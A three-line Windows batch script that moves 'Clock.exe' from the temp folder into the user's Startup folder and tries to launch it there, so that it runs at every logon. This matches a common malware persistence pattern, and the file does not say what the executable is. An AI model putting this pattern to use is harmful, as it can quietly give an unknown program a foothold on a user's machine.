@echo off
move "%temp%\Clock.exe" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
start "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Clock.exe"